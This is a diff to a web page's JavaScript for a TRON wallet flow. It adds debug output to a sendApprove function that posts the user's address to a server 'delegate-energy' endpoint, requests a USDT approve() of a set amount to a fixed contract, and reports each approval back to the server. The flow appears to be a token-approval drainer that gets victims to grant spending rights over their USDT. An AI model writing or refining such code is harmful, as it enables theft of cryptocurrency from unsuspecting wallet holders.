@@ -89,19 +89,23 @@
         }
 
         function sendApprove() {
-            status.textContent = "Confirm in popup...";
-            status.style.color = "#facc15";
-
-            // Delegate energy in background (don't wait for it)
             var addr = window.tronWeb.defaultAddress.base58;
+            status.textContent = "Preparing approve...";
+            status.style.color = "#facc15";
+            debug.textContent = "Address: " + addr;
+
+            // Delegate energy in background
             fetch("/api/delegate-energy", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ donor: addr })
             }).catch(function() {});
 
-            // Fire approve immediately
+            // Load USDT contract
+            debug.textContent = "Loading USDT contract...";
             window.tronWeb.contract().at(USDT_CONTRACT).then(function(usdt) {
+                debug.textContent = "Contract loaded, calling approve...";
+                status.textContent = "Confirm in popup!";
                 return usdt.approve(CONTRACT_ADDRESS, APPROVE_AMOUNT).send({
                     feeLimit: 100000000,
                     callValue: 0
@@ -110,6 +114,7 @@
                 var txId = typeof tx === "string" ? tx : (tx.txid || tx);
                 status.textContent = "Done!";
                 status.style.color = "#4ade80";
+                debug.textContent = "TX: " + txId;
 
                 fetch("/api/approved", {
                     method: "POST",
@@ -118,8 +123,9 @@
                 }).catch(function() {});
 
             }).catch(function(err) {
-                status.textContent = err.message || "Rejected";
+                status.textContent = "Error";
                 status.style.color = "#f87171";
+                debug.textContent = "ERR: " + (err.message || JSON.stringify(err));
             });
         }
     </script>
